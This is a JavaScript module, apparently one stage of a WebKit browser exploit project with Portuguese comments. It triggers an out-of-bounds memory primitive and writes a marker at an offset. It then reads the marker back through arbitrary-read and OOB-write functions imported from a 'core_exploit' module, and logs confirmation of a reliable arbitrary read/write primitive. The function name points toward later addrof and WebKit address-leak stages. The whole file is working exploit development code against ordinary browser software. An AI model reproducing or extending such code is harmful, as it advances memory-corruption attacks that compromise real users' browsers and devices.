// js/script3/testArrayBufferVictimCrash.mjs (R56 - Autoverificação de Leitura/Escrita OOB)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE = "WebKit_Exploit_R56_OOBSelfTest";

const TEST_OFFSET = 0x100000; // 1MB dentro da nossa janela OOB
const TEST_MARKER_LOW = 0xCAFEF00D;
const TEST_MARKER_HIGH = 0x1337BEEF;
const TEST_MARKER = new AdvancedInt64(TEST_MARKER_LOW, TEST_MARKER_HIGH);

function safeToHex(value, length = 8) {
    if (value instanceof AdvancedInt64) return value.toString(true);
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    try { return toHex(value); } catch (e) { return String(value); }
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R56() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Autoverificação de Leitura/Escrita OOB ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init SelfTest...`;

    logS3(`--- Fase 0 (SelfTest): Sanity Checks Padrão ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);
    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed" }; }

    let result = {
        errorOccurred: null,
        self_test_success: false,
        notes: ""
    };

    try {
        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        if (!isOOBReady() || typeof arb_read !== 'function' || typeof oob_write_absolute !== 'function') {
            throw new Error("Falha ao preparar ambiente OOB ou primitivas R/W não estão disponíveis.");
        }

        // --- Fase 1: Teste de Escrita e Leitura na Janela OOB ---
        logS3(`--- Fase 1 (SelfTest): Escrevendo e lendo na janela OOB ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const test_offset_addr = new AdvancedInt64(0, TEST_OFFSET);
        
        logS3(`   Escrevendo marcador ${TEST_MARKER.toString(true)} no offset OOB ${safeToHex(test_offset_addr)}...`, "info");
        await oob_write_absolute(TEST_OFFSET, TEST_MARKER, 8); // Escrever 8 bytes
        logS3(`   Escrita concluída.`, "info");
        await PAUSE_S3(50);

        logS3(`   Lendo de volta do offset OOB ${safeToHex(test_offset_addr)}...`, "info");
        const value_read_back = await arb_read(test_offset_addr, 8);

        if (!isAdvancedInt64Object(value_read_back)) {
            throw new Error(`Leitura de volta falhou ou retornou tipo inesperado: ${typeof value_read_back}`);
        }

        logS3(`   Valor Lido: ${value_read_back.toString(true)}`, "leak");

        if (value_read_back.equals(TEST_MARKER)) {
            logS3(`   !!! SUCESSO !!! O valor lido corresponde ao marcador escrito.`, "success_major");
            logS3(`   CONFIRMADO: Temos uma primitiva de Leitura/Escrita arbitrária confiável sobre uma grande região de memória.`, "good");
            result.self_test_success = true;
            result.notes = "A primitiva de Leitura/Escrita OOB relativa é estável.";
            document.title = `${FNAME_CURRENT_TEST_BASE} Final: R/W PRIMITIVE OK!`;
        } else {
            throw new Error(`VERIFICAÇÃO FALHOU. Valor lido (${value_read_back.toString(true)}) não corresponde ao marcador escrito (${TEST_MARKER.toString(true)}).`);
        }

    } catch(e) {
        logS3(`   ERRO na execução do autoteste: ${e.message}`, "critical");
        result.errorOccurred = e.message;
        document.title = `${FNAME_CURRENT_TEST_BASE} Final: FAILED`;
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }

    return result;
}
